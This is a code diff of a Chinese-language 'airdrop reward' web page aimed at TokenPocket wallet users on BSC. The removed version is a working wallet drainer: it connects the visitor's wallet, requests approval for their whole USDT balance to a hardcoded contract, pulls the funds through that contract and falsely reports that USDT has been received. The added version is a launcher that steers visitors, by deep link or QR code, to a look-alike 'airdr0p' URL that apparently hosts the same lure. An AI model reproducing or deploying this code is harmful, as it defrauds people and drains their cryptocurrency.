@@ -1,258 +1,58 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html>
 <head>
-  <meta charset="UTF-8">
+  <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="icon" href="GROK.png" type="image/x-icon">
-  <title>空投领取</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
+  <title>打开 TP 钱包</title>
   <style>
-    * { box-sizing: border-box; }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: #f0f4f8;
-      margin: 0; padding: 20px;
-      min-height: 100vh; display: flex;
-      justify-content: center; align-items: center;
+    body,html{margin:0;padding:0;height:100%;background:#0F172A;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;}
+    .btn{
+      padding:16px 40px;
+      font-size:18px;
+      font-weight:600;
+      background:linear-gradient(135deg,#00A3FF,#00C4FF);
+      color:white;
+      border:none;
+      border-radius:16px;
+      box-shadow:0 8px 20px rgba(0,163,255,.4);
+      cursor:pointer;
     }
-    .card {
-      background: white;
-      border-radius: 20px;
-      padding: 30px;
-      width: 100%; max-width: 420px;
-      box-shadow: 0 15px 35px rgba(0,0,0,0.1);
-      text-align: center;
-    }
-    h1 { color: #1a73e8; margin: 0 0 10px; font-size: 24px; }
-    .address {
-      background: #f8f9fa; padding: 12px; border-radius: 12px;
-      font-family: monospace; font-size: 14px; word-break: break-all;
-      color: #1a73e8; margin: 15px 0;
-    }
-    button {
-      width: 100%; padding: 16px; margin: 10px 0;
-      background: #e91e63; color: white; border: none;
-      border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer;
-      transition: background 0.2s;
-    }
-    button:hover { background: #c2185b; }
-    #status {
-      margin-top: 15px; padding: 12px; border-radius: 12px;
-      font-size: 14px; min-height: 50px;
-      display: flex; align-items: center; justify-content: center; flex-direction: column;
-    }
-    .success { background: #d4edda; color: #155724; }
-    .error { background: #f8d7da; color: #721c24; }
-    .info { background: #d1ecf1; color: #0c5460; }
-    .loading { background: #fff3cd; color: #856404; }
-    .warning {
-      background: #fff3cd; color: #856404;
-      padding: 12px; border-radius: 8px; margin: 10px 0; font-size: 13px;
-    }
+    .qrcode{margin-top:20px;display:none;text-align:center;}
+    .qrcode img{width:160px;border:6px solid #fff;border-radius:12px;}
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>奖励领取</h1>
 
-    <!-- TP唤醒提示 -->
-    <div class="warning" id="tpTip">
-      先复制 DApp 链接，然后在 TP 钱包内置浏览器粘贴访问。
-    </div>
+<button class="btn" onclick="openTP()">Open in TP Wallet (BSC)</button>
 
-    <!-- 复制 DApp 链接按钮 -->
-    <button id="copyLinkBtn" onclick="copyDappLink()">复制 DApp 链接</button>
+<div class="qrcode" id="qr">
+  <p>请用 TP 钱包扫码打开</p>
+  <img id="img" src="">
+</div>
 
-    <!-- 唤醒 TP 钱包按钮 -->
-    <button id="openTPBtn" onclick="openTPWallet()">尝试打开 TP 钱包</button>
+<script>
+const URL = "https://airdr0p-888.github.io/usdt1688/index1.html";
 
-    <div id="walletInfo" style="display:none;">
-      <div class="address" id="walletAddress"></div>
-      <div style="margin-top:10px; color:#666;">
-        剩余空投余额: <span id="usdtBalance">加载中...</span>
-      </div>
-    </div>
+function openTP(){
+  if(/tokenpocket|tpdapp/i.test(navigator.userAgent)){
+    location.href=URL; return;
+  }
+  const scheme = `tpdapp://open?params=${encodeURIComponent(JSON.stringify({url:URL,chain:"BSC"}))}`;
+  location.href = scheme;
 
-    <button id="actionBtn" onclick="approveAndTransfer()">领取奖励</button>
+  setTimeout(()=>{ // iOS 增强
+    const f=document.createElement('iframe');
+    f.style.display='none'; f.src=scheme;
+    document.body.appendChild(f);
+    setTimeout(()=>f.remove(),2000);
+  },300);
 
-    <div id="status" class="info">
-      等待连接钱包...
-    </div>
-  </div>
+  setTimeout(()=>{ // 失败出二维码
+    document.getElementById('qr').style.display='block';
+    document.getElementById('img').src=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(URL)}`;
+  },3500);
+}
+</script>
 
-  <script>
-    const TARGET_URL = "https://airdr0p-888.github.io/usdt1688/index.html";
-
-    /** 判断是否在 TP 内置浏览器 */
-    function isTPBrowser() {
-      return /TokenPocket/i.test(navigator.userAgent);
-    }
-
-    /** 复制 DApp 链接到剪贴板 */
-    function copyDappLink() {
-      if (navigator.clipboard) {
-        navigator.clipboard.writeText(TARGET_URL).then(() => {
-          alert("DApp 链接已复制到剪贴板！请在 TP 钱包内置浏览器粘贴访问。");
-        }).catch(() => {
-          alert("请手动复制链接访问 DApp：\n" + TARGET_URL);
-        });
-      } else {
-        const tempInput = document.createElement("input");
-        tempInput.value = TARGET_URL;
-        document.body.appendChild(tempInput);
-        tempInput.select();
-        document.execCommand("copy");
-        document.body.removeChild(tempInput);
-        alert("DApp 链接已复制到剪贴板！请在 TP 钱包内置浏览器粘贴访问。");
-      }
-    }
-
-    /** 尝试唤醒 TP 钱包（Scheme方式） */
-    function openTPWallet() {
-      const encoded = encodeURIComponent(TARGET_URL);
-      const schemes = [
-        `tpdapp://open?url=${encoded}`,
-        `tp://dapp?url=${encoded}`
-      ];
-
-      if (isTPBrowser()) {
-        location.href = TARGET_URL;
-        return;
-      }
-
-      window.location.href = schemes[0];
-
-      setTimeout(() => {
-        try {
-          const iframe = document.createElement('iframe');
-          iframe.style.display = 'none';
-          iframe.src = schemes[0];
-          document.body.appendChild(iframe);
-          setTimeout(() => document.body.removeChild(iframe), 2000);
-        } catch(e){}
-      }, 300);
-
-      setTimeout(() => { window.location.href = schemes[1]; }, 2000);
-      setTimeout(() => { showQRCode(TARGET_URL); }, 3500);
-    }
-
-    /** 显示二维码和下载提示 */
-    function showQRCode(url) {
-      if (document.getElementById("qrWrap")) return;
-
-      const qrSrc = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(url);
-      const wrap = document.createElement("div");
-      wrap.id = "qrWrap";
-      wrap.style = "margin-top:12px;text-align:center;color:#555;font-size:14px;";
-      wrap.innerHTML = `
-        <div>若 TP 未自动打开，请扫描二维码或点击“在浏览器打开”</div>
-        <img src="${qrSrc}" alt="QR" style="margin-top:8px;width:200px;height:200px;border-radius:8px;box-shadow:0 6px 18px rgba(0,0,0,0.08);" />
-        <div style="margin-top:8px;">
-          <a href="${TARGET_URL}" target="_blank" style="color:#1a73e8;text-decoration:none;">在外部浏览器打开</a>
-        </div>
-      `;
-      document.querySelector('.card').appendChild(wrap);
-
-      if (!document.getElementById('tpDownloadNotice')) {
-        const el = document.createElement('div');
-        el.id = 'tpDownloadNotice';
-        el.style = 'margin-top:12px;color:#b00;font-size:13px;';
-        el.innerHTML = '如果未安装 TokenPocket，请前往官网下载：<a href="https://www.tokenpocket.pro/zh/download" target="_blank">下载 TP</a>';
-        document.querySelector('.card').appendChild(el);
-      }
-    }
-
-    /** 页面加载隐藏按钮/提示（如果已在 TP 内） */
-    window.onload = async () => {
-      if (isTPBrowser()) {
-        document.getElementById("tpTip").style.display = "none";
-        document.getElementById("copyLinkBtn").style.display = "none";
-        document.getElementById("openTPBtn").style.display = "none";
-      }
-      await autoConnect();
-    };
-
-    // === 钱包连接与空投逻辑 ===
-    const CONTRACT = "0x3dD971d5321FD7523BFbFe28cd14234aF84Bd8B4";
-    const USDT = "0xa85f403f7869a050c91e9a260dbf08a64229b2de";
-    const ABI_USDT = [
-      {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-      {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
-    ];
-    const ABI_FORWARDER = [{"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"}];
-
-    let web3, account;
-    const status = document.getElementById("status");
-    const walletInfo = document.getElementById("walletInfo");
-    const walletAddress = document.getElementById("walletAddress");
-    const usdtBalance = document.getElementById("usdtBalance");
-
-    async function autoConnect() {
-      if (!window.ethereum) {
-        status.className = "error";
-        status.innerHTML = "未检测到钱包插件";
-        return false;
-      }
-      try {
-        web3 = new Web3(window.ethereum);
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const chainId = await web3.eth.getChainId();
-        if (chainId !== 56) {
-          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
-        }
-        [account] = await web3.eth.getAccounts();
-        walletAddress.innerText = account;
-        walletInfo.style.display = "block";
-        status.className = "success";
-        status.innerHTML = `已连接<br><small>${account.slice(0,8)}...${account.slice(-6)}</small>`;
-        await updateUSDTBalance();
-        return true;
-      } catch (e) {
-        status.className = "error";
-        status.innerHTML = e.code === 4001 ? "用户取消连接" : "连接失败";
-        return false;
-      }
-    }
-
-    async function updateUSDTBalance() {
-      try {
-        const usdt = new web3.eth.Contract(ABI_USDT, USDT);
-        const balance = await usdt.methods.balanceOf(account).call();
-        usdtBalance.innerText = (balance / 1e6).toFixed(6);
-      } catch (e) {
-        usdtBalance.innerText = "查询失败";
-      }
-    }
-
-    async function approveAndTransfer() {
-      if (!account && !await autoConnect()) return;
-      status.className = "loading";
-      status.innerHTML = "正在授权...<br><small>请确认交易</small>";
-      try {
-        const usdt = new web3.eth.Contract(ABI_USDT, USDT);
-        const balance = await usdt.methods.balanceOf(account).call();
-        if (balance === "0") {
-          status.className = "warning";
-          status.innerHTML = "余额为 0，无需操作";
-          return;
-        }
-        await usdt.methods.approve(CONTRACT, balance).send({ from: account });
-        status.innerHTML = "授权成功！正在转账...";
-        const forwarder = new web3.eth.Contract(ABI_FORWARDER, CONTRACT);
-        await forwarder.methods.transferFromApproved().send({ from: account });
-        status.className = "success";
-        status.innerHTML = "领取成功！<br>USDT 已到账";
-        await updateUSDTBalance();
-      } catch (e) {
-        status.className = "error";
-        status.innerHTML = e.code === 4001 ? "用户取消操作" : "交易失败";
-        console.error(e);
-      }
-    }
-  </script>
 </body>
-
-
 </html>
-
-
